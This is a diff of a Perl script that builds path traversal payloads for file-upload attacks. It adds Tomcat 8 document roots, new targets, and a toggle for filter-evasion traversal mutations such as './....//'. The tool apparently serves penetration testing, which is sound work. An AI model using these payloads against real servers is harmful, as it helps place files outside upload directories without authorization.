@@ -11,16 +11,17 @@ use strict;
 
 # CONFIG SECTION STARTS HERE
 
-my $filename='test.html';
-my @targets=('example.org','example','EXAMPLE');
+my $filename='test.png';
+my @targets=('uploadbare','localhost');
 my $auto_append_traversals=1; # if set to 1, include traversal versions of the document root payloads as well
 my $auto_append_filename=1;   # if set to 1, automatically append the specified filename to each payload
 my $auto_append_pure_traversals=1; # if set to 1, include the relative (docroot independant) traversal payloads as well (the ones to jump out from unknown upload directories located inside the document root)
+my $evasive_techniques=1; # if set to 1, include filter evasion mutations of the document roots to the results
 
-my @traversals=('',
-'./../../../../../../../../',
-'./....//....//....//....//....//....//....//....//',
-'..//...//...//...//...//...//...//...//...//');
+my @traversals=(
+'',
+'./../../../../../../../../'
+);
 
 my @pure_traversals=(
 './../',
@@ -30,7 +31,15 @@ my @pure_traversals=(
 './../../../../../',
 './../../../../../../',
 './../../../../../../../',
-'./../../../../../../../../',
+'./../../../../../../../../'
+);
+
+my @evasive_traversals=(
+'./....//....//....//....//....//....//....//....//',
+'..//...//...//...//...//...//...//...//...//'
+);
+
+my @evasive_pure_traversals=(
 './....//....//',
 './....//....//....//',
 './....//....//....//....//',
@@ -91,23 +100,31 @@ my @tomcat_doc_roots=(
  "/opt/tomcat5/{TARGET}",
  "/opt/tomcat6/{TARGET}",
  "/opt/tomcat7/{TARGET}",
+ "/opt/tomcat8/{TARGET}",
  "/opt/tomcat5/webapps/{TARGET}",
  "/opt/tomcat6/webapps/{TARGET}",
  "/opt/tomcat7/webapps/{TARGET}",
+ "/opt/tomcat8/webapps/{TARGET}",
  "/opt/tomcat5/webapps",
  "/opt/tomcat6/webapps",
  "/opt/tomcat7/webapps",
+ "/opt/tomcat8/webapps",
  "/var/lib/tomcat7/webapps",
- "/var/lib/tomcat7/webapps/{TARGET}"
+ "/var/lib/tomcat7/webapps/{TARGET}",
+ "/var/lib/tomcat8/webapps",
+ "/var/lib/tomcat8/webapps/{TARGET}"
  );
  
 # Suffixes used in brute force search for web server document root
 my @brute_doc_root_suffixes=("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "data", "sites/all", "www/build");
 my @brute_doc_root_prefixes = (@universal_doc_roots, @nginx_doc_roots, @apache_doc_roots, @tomcat_doc_roots);
-
 # END OF THE CONFIG SECTION
 
-
+if($evasive_techniques eq 1)
+{
+	push(@traversals,@evasive_traversals);
+	push(@pure_traversals,@evasive_pure_traversals);
+}
 
 
 my %target_docroots;
